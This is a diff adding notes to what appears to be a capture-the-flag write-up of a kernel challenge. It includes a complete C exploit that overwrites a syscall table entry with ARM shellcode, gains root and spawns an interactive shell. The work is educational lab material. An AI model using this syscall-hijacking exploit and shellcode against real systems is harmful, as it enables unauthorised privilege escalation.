@@ -106,5 +106,51 @@ Virtual kernel memory layout:
 
 since we are given the address of the syscall table, perhaps we can set the address that a certain syscall points to to a different kernal function that may result in privelage change
 
-> that results in privilege change
->
+ill test by manually changing a syscall to a similar syscall (ones with similar arguments and calling conventions)
+
+this worked!
+
+after getting stuck for about a day i ended up losing direction and reading a writeup :-( FAILED! turns out the solution was to overwrite one of hte syscalls with some shellcode that eseclates privelge. honeslty this was my direction for a while, but i thought itd be impossible to write shellcdoe that uses ZERO null bytes, lower case ascii etc all the limitations.
+
+I ended up using this direction but instead of catting the flag directly just spawning a shell and giving me root :)
+
+heres my modified exploit:
+
+```
+  #include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+
+#define upper_id 223
+#define TRIG 343
+
+int main(){
+    char sc[] =
+    "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x01\xb5\x92\x1a"
+    "\x10\x1c\xf0\x46\x02\x4a\x90\x47\x02\x4a\x1c\x32"
+    "\x90\x47\x01\xbd\x24\xf9\x03\x80\x50\xf5\x03\x80";
+
+    void *p = (void*)0x800e3dc8;
+    printf("hijacking");
+    syscall(upper_id, sc, p);
+
+    syscall(TRIG);
+    if(getuid()!=0){
+        printf("didnt get root");
+        return 1;
+    }
+    printf("root 👌😁");
+    execl("/bin/sh","sh","-i",0);
+
+    return 0;
+}
+
+```
+
+![1774523225784](images/readme/1774523225784.png)
+
+ROOT:)
+
+![1774523259941](images/readme/1774523259941.png)
+
+nice done !
